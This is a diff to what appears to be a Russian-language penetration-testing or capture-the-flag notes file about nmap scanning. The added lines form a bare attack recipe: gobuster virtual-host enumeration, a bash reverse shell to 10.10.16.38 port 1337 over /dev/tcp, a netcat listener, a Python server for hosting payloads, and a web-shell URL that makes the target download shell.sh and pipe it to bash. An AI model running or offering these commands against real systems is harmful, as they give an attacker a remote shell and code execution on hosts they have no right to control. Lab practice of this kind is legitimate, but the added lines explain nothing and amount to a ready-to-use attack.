@@ -75,6 +75,18 @@ PORT    STATE SERVICE  VERSION
 ```
 
 ---
+#gobuster vhost -w /home/lolkek/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://target.com --append-domain.com
+
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.16.38/1337 0>&1
+
+nc -nvlp 1337
+python3 -m http.server 8000
+
+
+http://target.com/shell.php?cmd=curl%2010.10.16.38:8000/shell.sh|bash
+---
 
 ### **Важные замечания**
 1. **Права доступа:** Для выполнения таких сканирований могут потребоваться права суперпользователя (`sudo`), особенно если используется агрессивный режим (`-T4`).
